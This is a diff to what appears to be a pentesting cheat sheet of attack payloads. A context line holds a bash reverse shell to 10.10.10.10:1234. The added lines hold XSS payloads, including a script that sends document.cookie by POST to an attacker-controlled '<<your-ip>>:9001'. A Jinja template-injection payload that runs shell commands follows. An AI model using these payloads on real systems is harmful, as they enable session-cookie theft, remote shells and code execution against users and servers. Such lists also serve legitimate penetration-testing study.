@@ -68,7 +68,17 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 - [Xss Payload](https://github.com/payloadbox/xss-payload-list) --> Payload XSS
 	- `<iframe src="javascript:alert('xss')">`
  	- `<script>alert(‘XSS’)</script>`
-    	- Cookie --> `</script><img src=1 onerror=alert(document.cookie)>`
+    		- Cookie --> `</script><img src=1 onerror=alert(document.cookie)>` ou
+    
+    ```javascript=
+    <script>
+    fetch('http://<<your-ip>>:9001/', {
+              method: 'POST',
+              mode: 'no-cors',
+              body:document.cookie
+        });
+	</script>
+    ```
  
 - Jinga :
   	- `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` --> payload id
